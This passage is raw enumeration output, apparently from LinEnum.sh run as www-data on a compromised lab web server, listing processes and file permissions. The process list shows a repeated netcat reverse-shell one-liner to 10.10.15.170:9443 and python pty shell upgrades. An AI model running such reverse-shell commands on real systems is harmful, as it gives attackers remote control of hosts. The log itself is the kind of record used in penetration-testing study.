root          87  0.0  0.0      0     0 ?        S    16:02   0:00 [watchdogd]
root          90  0.0  0.0      0     0 ?        S    16:02   0:00 [kswapd0]
root          91  0.0  0.0      0     0 ?        S    16:02   0:00 [ecryptfs-kthrea]
root          93  0.0  0.0      0     0 ?        I<   16:02   0:00 [kthrotld]
root          94  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/24-pciehp]
root          95  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/25-pciehp]
root          96  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/26-pciehp]
root          97  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/27-pciehp]
root          98  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/28-pciehp]
root          99  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/29-pciehp]
root         100  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/30-pciehp]
root         101  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/31-pciehp]
root         102  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/32-pciehp]
root         103  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/33-pciehp]
root         104  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/34-pciehp]
root         105  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/35-pciehp]
root         106  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/36-pciehp]
root         107  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/37-pciehp]
root         108  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/38-pciehp]
root         109  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/39-pciehp]
root         110  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/40-pciehp]
root         111  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/41-pciehp]
root         112  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/42-pciehp]
root         113  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/43-pciehp]
root         114  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/44-pciehp]
root         115  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/45-pciehp]
root         116  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/46-pciehp]
root         117  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/47-pciehp]
root         118  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/48-pciehp]
root         119  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/49-pciehp]
root         120  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/50-pciehp]
root         121  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/51-pciehp]
root         122  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/52-pciehp]
root         123  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/53-pciehp]
root         124  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/54-pciehp]
root         125  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/55-pciehp]
root         126  0.0  0.0      0     0 ?        I<   16:02   0:00 [acpi_thermal_pm]
root         127  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_0]
root         128  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_0]
root         129  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_1]
root         130  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_1]
root         132  0.0  0.0      0     0 ?        I<   16:02   0:00 [vfio-irqfd-clea]
root         133  0.0  0.0      0     0 ?        I<   16:02   0:00 [ipv6_addrconf]
root         144  0.0  0.0      0     0 ?        I<   16:02   0:00 [kstrp]
root         147  0.0  0.0      0     0 ?        I<   16:02   0:00 [kworker/u257:0]
root         160  0.0  0.0      0     0 ?        I<   16:02   0:00 [charger_manager]
root         194  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_2]
root         195  0.0  0.0      0     0 ?        I<   16:02   0:00 [mpt_poll_0]
root         196  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_2]
root         197  0.0  0.0      0     0 ?        I<   16:02   0:00 [mpt/0]
root         198  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_3]
root         199  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_3]
root         200  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_4]
root         201  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_4]
root         202  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_5]
root         203  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_5]
root         204  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_6]
root         205  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_6]
root         206  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_7]
root         207  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_7]
root         208  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_8]
root         209  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_8]
root         210  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_9]
root         211  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_9]
root         212  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_10]
root         213  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_10]
root         214  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_11]
root         215  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_11]
root         216  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_12]
root         217  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_12]
root         218  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_13]
root         219  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_13]
root         220  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_14]
root         221  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_14]
root         222  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_15]
root         223  0.0  0.0      0     0 ?        I<   16:02   0:00 [cryptd]
root         226  0.0  0.0      0     0 ?        S    16:02   0:00 [irq/16-vmwgfx]
root         228  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_15]
root         229  0.0  0.0      0     0 ?        I<   16:02   0:00 [ttm_swap]
root         232  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_16]
root         236  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_16]
root         239  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_17]
root         245  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_17]
root         247  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_18]
root         253  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_18]
root         255  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_19]
root         256  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_19]
root         257  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_20]
root         259  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_20]
root         260  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_21]
root         262  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_21]
root         264  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_22]
root         267  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_22]
root         268  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_23]
root         270  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_23]
root         271  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_24]
root         272  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_24]
root         273  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_25]
root         274  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_25]
root         275  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_26]
root         276  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_26]
root         277  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_27]
root         278  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_27]
root         279  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_28]
root         280  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_28]
root         281  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_29]
root         282  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_29]
root         283  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_30]
root         284  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_30]
root         285  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_31]
root         291  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_31]
root         320  0.0  0.0      0     0 ?        S    16:02   0:00 [scsi_eh_32]
root         321  0.0  0.0      0     0 ?        I<   16:02   0:00 [scsi_tmf_32]
root         322  0.0  0.0      0     0 ?        I<   16:02   0:00 [kworker/1:1H-kblockd]
root         334  0.0  0.0      0     0 ?        I<   16:02   0:00 [kdmflush]
root         336  0.0  0.0      0     0 ?        I<   16:02   0:00 [kdmflush]
root         368  0.0  0.0      0     0 ?        I<   16:02   0:00 [raid5wq]
root         408  0.0  0.0      0     0 ?        I<   16:02   0:00 [kworker/0:1H-kblockd]
root         409  0.0  0.0      0     0 ?        S    16:02   0:00 [jbd2/dm-0-8]
root         410  0.0  0.0      0     0 ?        I<   16:02   0:00 [ext4-rsv-conver]
root         467  0.0  1.2  51672 12208 ?        S<s  16:02   0:00 /lib/systemd/systemd-journald
root         496  0.0  0.6  21872  5932 ?        Ss   16:02   0:01 /lib/systemd/systemd-udevd
root         498  0.0  0.0      0     0 ?        I    16:02   0:02 [kworker/0:4-events]
systemd+     504  0.0  0.7  18596  7656 ?        Ss   16:02   0:00 /lib/systemd/systemd-networkd
root         667  0.0  0.0      0     0 ?        I<   16:02   0:00 [kaluad]
root         668  0.0  0.0      0     0 ?        I<   16:02   0:00 [kmpath_rdacd]
root         669  0.0  0.0      0     0 ?        I<   16:02   0:00 [kmpathd]
root         670  0.0  0.0      0     0 ?        I<   16:02   0:00 [kmpath_handlerd]
root         671  0.0  1.8 345816 18212 ?        SLsl 16:02   0:01 /sbin/multipathd -d -s
root         682  0.0  0.0      0     0 ?        S<   16:02   0:00 [loop0]
root         686  0.0  0.0      0     0 ?        S    16:02   0:00 [jbd2/sda2-8]
root         687  0.0  0.0      0     0 ?        I<   16:02   0:00 [ext4-rsv-conver]
root         688  0.0  0.0      0     0 ?        S<   16:02   0:00 [loop1]
root         689  0.0  0.0      0     0 ?        S<   16:02   0:00 [loop2]
root         690  0.0  0.0      0     0 ?        S<   16:02   0:00 [loop3]
root         691  0.0  0.0      0     0 ?        S<   16:02   0:00 [loop4]
root         692  0.0  0.0      0     0 ?        S<   16:02   0:00 [loop5]
systemd+     711  0.0  0.6  90424  6400 ?        Ssl  16:02   0:00 /lib/systemd/systemd-timesyncd
root         724  0.0  1.1  47524 10816 ?        Ss   16:02   0:00 /usr/bin/VGAuthService
root         727  0.0  0.7 161112  7088 ?        S<sl 16:02   0:02 /usr/bin/vmtoolsd
root         753  0.0  0.6  99896  6052 ?        Ssl  16:02   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
root         780  0.0  0.9 239276  9388 ?        Ssl  16:02   0:00 /usr/lib/accountsservice/accounts-daemon
message+     781  0.0  0.4   7616  4592 ?        Ss   16:02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         788  0.0  0.3  81928  3852 ?        Ssl  16:02   0:00 /usr/sbin/irqbalance --foreground
root         789  0.0  1.8  29068 18052 ?        Ss   16:02   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog       792  0.0  0.5 224348  5316 ?        Ssl  16:02   0:00 /usr/sbin/rsyslogd -n -iNONE
root         793  0.0  2.8 775764 28008 ?        Ssl  16:02   0:01 /usr/lib/snapd/snapd
root         794  0.0  0.6  16672  6048 ?        Ss   16:02   0:00 /lib/systemd/systemd-logind
root         858  0.0  0.9 236416  9204 ?        Ssl  16:02   0:00 /usr/lib/policykit-1/polkitd --no-debug
systemd+     879  0.0  1.2  24240 12432 ?        Ss   16:02   0:00 /lib/systemd/systemd-resolved
root         966  0.0  0.3   6812  3048 ?        Ss   16:02   0:00 /usr/sbin/cron -f
daemon       970  0.0  0.2   3792  2316 ?        Ss   16:02   0:00 /usr/sbin/atd -f
root         980  0.0  0.1   5828  1828 tty1     Ss+  16:02   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1002  0.0  0.7  12176  7320 ?        Ss   16:02   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1038  0.0  2.7 221412 26836 ?        Ss   16:02   0:00 /usr/sbin/apache2 -k start
www-data    1040  0.0  2.4 296076 23748 ?        S    16:02   0:00 /usr/sbin/apache2 -k start
www-data    1043  0.0  2.3 222304 23356 ?        S    16:02   0:00 /usr/sbin/apache2 -k start
www-data    1351  0.0  2.3 295992 23412 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1372  0.0  2.3 222044 22732 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1381  0.0  2.3 222532 23352 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1385  0.0  2.3 295956 23116 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1412  0.0  2.1 222192 21284 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1430  0.0  2.3 295856 23384 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1440  0.0  2.2 222216 21984 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
www-data    1442  0.0  2.2 222052 22036 ?        S    16:06   0:00 /usr/sbin/apache2 -k start
root        1915  0.0  2.2 373040 22272 ?        Ssl  16:19   0:00 /usr/libexec/fwupd/fwupd
root        2564  0.0  0.0      0     0 ?        I    16:38   0:00 [kworker/1:2-events]
root        2928  0.0  0.0      0     0 ?        I    16:53   0:00 [kworker/u256:2-events_power_efficient]
www-data    3303  0.0  0.0   2608   608 ?        S    17:08   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.170 9443 >/tmp/f
www-data    3306  0.0  0.0   2652   592 ?        S    17:08   0:00 cat /tmp/f
www-data    3307  0.0  0.0   2608   604 ?        S    17:08   0:00 /bin/sh -i
www-data    3308  0.0  0.2   3332  2024 ?        S    17:08   0:00 nc 10.10.15.170 9443
root        3384  0.0  0.0      0     0 ?        I    17:08   0:00 [kworker/1:0-memcg_kmem_cache]
root        3387  0.0  0.0      0     0 ?        D    17:08   0:00 [kworker/0:1+events]
www-data    3411  0.0  0.9  15948  9520 ?        S    17:09   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data    3412  0.0  0.4   7816  4104 pts/0    Ss+  17:09   0:00 /bin/bash
root        3466  0.0  0.0      0     0 ?        I    17:11   0:00 [kworker/u256:1-events_unbound]
www-data    3477  0.0  0.0   2608   544 ?        S    17:11   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.170 9443 >/tmp/f
www-data    3480  0.0  0.0   2652   592 ?        S    17:11   0:00 cat /tmp/f
www-data    3481  0.0  0.0   2608   604 ?        S    17:11   0:00 /bin/sh -i
www-data    3482  0.0  0.1   3332  1944 ?        S    17:11   0:00 nc 10.10.15.170 9443
www-data    3487  0.0  0.9  16076  9552 ?        S    17:11   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data    3488  0.0  0.3   7304  3688 pts/1    Ss   17:11   0:00 /bin/bash
root        3605  0.0  0.0      0     0 ?        I    17:16   0:00 [kworker/u256:0-events_unbound]
www-data    3635  0.0  2.5  90536 24664 pts/1    S+   17:16   0:00 php
www-data    3651  0.0  0.0   2608   536 ?        S    17:17   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.170 9443 >/tmp/f
www-data    3654  0.0  0.0   2652   592 ?        S    17:17   0:00 cat /tmp/f
www-data    3655  0.0  0.0   2608   548 ?        S    17:17   0:00 /bin/sh -i
www-data    3656  0.0  0.2   3332  2068 ?        S    17:17   0:00 nc 10.10.15.170 9443
www-data    3661  0.0  0.9  15948  9520 ?        S    17:17   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data    3662  0.0  0.3   7304  3668 pts/2    Ss   17:17   0:00 /bin/bash
www-data    3711  0.0  0.4   8096  4016 pts/2    S+   17:19   0:00 /bin/bash ./LinEnum.sh
www-data    3712  0.0  0.2   8096  2884 pts/2    S+   17:19   0:00 /bin/bash ./LinEnum.sh
www-data    3713  0.0  0.0   5712   584 pts/2    S+   17:19   0:00 tee -a
root        3931  0.0  0.3  21872  3644 ?        S    17:19   0:00 /lib/systemd/systemd-udevd
root        3933  0.0  0.0      0     0 ?        I    17:19   0:00 [kworker/0:0]
www-data    3939  0.0  0.2   8096  2628 pts/2    S+   17:19   0:00 /bin/bash ./LinEnum.sh
www-data    3940  0.0  0.3   9092  3152 pts/2    R+   17:19   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
-rwxr-xr-x 1 root root  1183448 Jun 18  2020 /bin/bash
lrwxrwxrwx 1 root root        4 Feb  1  2021 /bin/sh -> dash
-rwxr-xr-x 1 root root   162032 Jan  6  2021 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   268576 Jan  6  2021 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root  2233344 Jan  6  2021 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root root   411872 Jan  6  2021 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root root    55520 Jan  6  2021 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   744008 Jan  6  2021 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    69000 Jul 21  2020 /sbin/agetty
-rwxr-xr-x 1 root root   521200 Apr 10  2020 /sbin/dhclient
lrwxrwxrwx 1 root root       20 Jan  6  2021 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   129224 Apr  6  2020 /sbin/multipathd
-rwxr-xr-x 1 root root   141696 Mar  9  2020 /usr/bin/VGAuthService
-rwxr-xr-x 1 root root   249032 Jun 11  2020 /usr/bin/dbus-daemon
lrwxrwxrwx 1 root root        9 Mar 13  2020 /usr/bin/python3 -> python3.8
-rwxr-xr-x 1 root root    63904 Mar  9  2020 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   203192 Nov  2  2020 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root   121504 Aug 16  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 27700528 Nov 19  2020 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root   260616 Jun 18  2020 /usr/libexec/fwupd/fwupd
-rwxr-xr-x 1 root root   704520 Aug 12  2020 /usr/sbin/apache2
-rwxr-xr-x 1 root root    30728 Nov 12  2018 /usr/sbin/atd
-rwxr-xr-x 1 root root    55944 Feb 13  2020 /usr/sbin/cron
-rwxr-xr-x 1 root root    64432 Feb 13  2020 /usr/sbin/irqbalance
-rwxr-xr-x 1 root root   727248 Aug  4  2020 /usr/sbin/rsyslogd


[-] /etc/init.d/ binary permissions:
total 160
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rwxr-xr-x  1 root root 2489 Apr 13  2020 apache-htcacheclean
-rwxr-xr-x  1 root root 8181 Apr 13  2020 apache2
-rwxr-xr-x  1 root root 3740 Apr  1  2020 apparmor
-rwxr-xr-x  1 root root 2964 Dec  6  2019 apport
-rwxr-xr-x  1 root root 1071 Jul 24  2018 atd
-rwxr-xr-x  1 root root 1232 Mar 27  2020 console-setup.sh
-rwxr-xr-x  1 root root 3059 Feb 11  2020 cron
-rwxr-xr-x  1 root root  937 Feb  4  2020 cryptdisks
-rwxr-xr-x  1 root root  896 Feb  4  2020 cryptdisks-early
-rwxr-xr-x  1 root root 3152 Sep 30  2019 dbus
-rwxr-xr-x  1 root root  985 Jan 13  2021 grub-common
-rwxr-xr-x  1 root root 3809 Jul 28  2019 hwclock.sh
-rwxr-xr-x  1 root root 2638 Dec 13  2019 irqbalance
-rwxr-xr-x  1 root root 1503 May 11  2020 iscsid
-rwxr-xr-x  1 root root 1479 Nov 27  2019 keyboard-setup.sh
-rwxr-xr-x  1 root root 2044 Feb 19  2020 kmod
-rwxr-xr-x  1 root root  695 Jan 28  2020 lvm2
-rwxr-xr-x  1 root root  586 Jan 28  2020 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2827 Jan  9  2020 multipath-tools
-rwxr-xr-x  1 root root 5607 Nov  6  2019 mysql
-rwxr-xr-x  1 root root 4445 Jan 29  2019 networking
-rwxr-xr-x  1 root root 2503 May 11  2020 open-iscsi
-rwxr-xr-x  1 root root 1846 Mar  9  2020 open-vm-tools
-rwxr-xr-x  1 root root 1366 Mar 23  2020 plymouth
-rwxr-xr-x  1 root root  752 Mar 23  2020 plymouth-log
-rwxr-xr-x  1 root root  924 Feb 13  2020 procps
-rwxr-xr-x  1 root root 4417 Oct 15  2019 rsync
-rwxr-xr-x  1 root root 2864 Mar  7  2019 rsyslog
-rwxr-xr-x  1 root root 1222 Apr  2  2017 screen-cleanup
-rwxr-xr-x  1 root root 3939 May 29  2020 ssh
-rwxr-xr-x  1 root root 6872 Apr 22  2020 udev
-rwxr-xr-x  1 root root 2083 Jan 21  2020 ufw
-rwxr-xr-x  1 root root 1306 Jul 21  2020 uuidd


[-] /etc/init/ config file permissions:
total 12
drwxr-xr-x  2 root root 4096 Mar 12  2024 .
drwxr-xr-x 95 root root 4096 Mar 12  2024 ..
-rw-r--r--  1 root root 1757 Nov  6  2019 mysql.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.6M
drwxr-xr-x  3 root root 4.0K Mar 12  2024 boot
drwxr-xr-x  2 root root 4.0K Mar 12  2024 system-generators
drwxr-xr-x 24 root root  20K Mar 12  2024 system
drwxr-xr-x  2 root root 4.0K Mar 12  2024 system-sleep
drwxr-xr-x  2 root root 4.0K Mar 12  2024 catalog
drwxr-xr-x  2 root root 4.0K Mar 12  2024 network
drwxr-xr-x  2 root root 4.0K Mar 12  2024 ntp-units.d
drwxr-xr-x  2 root root 4.0K Mar 12  2024 system-environment-generators
drwxr-xr-x  2 root root 4.0K Mar 12  2024 system-preset
drwxr-xr-x  2 root root 4.0K Mar 12  2024 system-shutdown
drwxr-xr-x  4 root root 4.0K Mar 12  2024 user
drwxr-xr-x  2 root root 4.0K Mar 12  2024 user-environment-generators
drwxr-xr-x  2 root root 4.0K Mar 12  2024 user-generators
drwxr-xr-x  2 root root 4.0K Mar 12  2024 user-preset
-rw-r--r--  1 root root 2.4M Jan  6  2021 libsystemd-shared-245.so
-rw-r--r--  1 root root  701 Jan  6  2021 resolv.conf
-rwxr-xr-x  1 root root 1.3K Jan  6  2021 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Jan  6  2021 systemd
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-ac-power
-rwxr-xr-x  1 root root  27K Jan  6  2021 systemd-backlight
-rwxr-xr-x  1 root root  19K Jan  6  2021 systemd-binfmt
-rwxr-xr-x  1 root root  31K Jan  6  2021 systemd-bless-boot
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-boot-check-no-failures
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-cgroups-agent
-rwxr-xr-x  1 root root  35K Jan  6  2021 systemd-cryptsetup
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-dissect
-rwxr-xr-x  1 root root  27K Jan  6  2021 systemd-fsck
-rwxr-xr-x  1 root root  31K Jan  6  2021 systemd-fsckd
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-growfs
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-hibernate-resume
-rwxr-xr-x  1 root root  35K Jan  6  2021 systemd-hostnamed
-rwxr-xr-x  1 root root  19K Jan  6  2021 systemd-initctl
-rwxr-xr-x  1 root root 159K Jan  6  2021 systemd-journald
-rwxr-xr-x  1 root root  43K Jan  6  2021 systemd-localed
-rwxr-xr-x  1 root root 263K Jan  6  2021 systemd-logind
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-makefs
-rwxr-xr-x  1 root root  19K Jan  6  2021 systemd-modules-load
-rwxr-xr-x  1 root root  35K Jan  6  2021 systemd-network-generator
-rwxr-xr-x  1 root root 2.2M Jan  6  2021 systemd-networkd
-rwxr-xr-x  1 root root  31K Jan  6  2021 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-pstore
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-quotacheck
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-random-seed
-rwxr-xr-x  1 root root  19K Jan  6  2021 systemd-remount-fs
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-reply-password
-rwxr-xr-x  1 root root 403K Jan  6  2021 systemd-resolved
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-rfkill
-rwxr-xr-x  1 root root  55K Jan  6  2021 systemd-shutdown
-rwxr-xr-x  1 root root  27K Jan  6  2021 systemd-sleep
-rwxr-xr-x  1 root root  31K Jan  6  2021 systemd-socket-proxyd
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-sulogin-shell
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-sysctl
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-time-wait-sync
-rwxr-xr-x  1 root root  47K Jan  6  2021 systemd-timedated
-rwxr-xr-x  1 root root  55K Jan  6  2021 systemd-timesyncd
-rwxr-xr-x  1 root root 727K Jan  6  2021 systemd-udevd
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-update-utmp
-rwxr-xr-x  1 root root  23K Jan  6  2021 systemd-user-runtime-dir
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-user-sessions
-rwxr-xr-x  1 root root  15K Jan  6  2021 systemd-veritysetup
-rwxr-xr-x  1 root root  19K Jan  6  2021 systemd-volatile-root
-rwxr-xr-x  1 root root 1.4K Jan  6  2021 systemd-sysv-install

/lib/systemd/boot:
total 4.0K
drwxr-xr-x 2 root root 4.0K Mar 12  2024 efi

/lib/systemd/boot/efi:
total 148K
-rwxr-xr-x 1 root root 55K Jan  6  2021 linuxx64.efi.stub
-rwxr-xr-x 1 root root 90K Jan  6  2021 systemd-bootx64.efi

/lib/systemd/system-generators:
total 468K
-rwxr-xr-x 1 root root  15K Jan  6  2021 systemd-bless-boot-generator
-rwxr-xr-x 1 root root  35K Jan  6  2021 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  15K Jan  6  2021 systemd-debug-generator
-rwxr-xr-x 1 root root  39K Jan  6  2021 systemd-fstab-generator
-rwxr-xr-x 1 root root  19K Jan  6  2021 systemd-getty-generator
-rwxr-xr-x 1 root root  35K Jan  6  2021 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  15K Jan  6  2021 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  15K Jan  6  2021 systemd-rc-local-generator
-rwxr-xr-x 1 root root  15K Jan  6  2021 systemd-run-generator
-rwxr-xr-x 1 root root  15K Jan  6  2021 systemd-system-update-generator
-rwxr-xr-x 1 root root  35K Jan  6  2021 systemd-sysv-generator
-rwxr-xr-x 1 root root  19K Jan  6  2021 systemd-veritysetup-generator
-rwxr-xr-x 1 root root  31K Nov 19  2020 snapd-generator
-rwxr-xr-x 1 root root 148K Feb 13  2020 lvm2-activation-generator
-rwxr-xr-x 1 root root  286 Jun 21  2019 friendly-recovery

/lib/systemd/system:
total 1.2M
lrwxrwxrwx 1 root root    9 Feb  1  2021 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Feb  1  2021 system-update.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 halt.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 getty.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Feb  1  2021 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 timers.target.wants
drwxr-xr-x 2 root root 4.0K Feb  1  2021 user-.slice.d
drwxr-xr-x 2 root root 4.0K Feb  1  2021 user@.service.d
lrwxrwxrwx 1 root root    9 Jan 19  2021 sudo.service -> /dev/null
-rw-r--r-- 1 root root  389 Jan 14  2021 apt-daily-upgrade.service
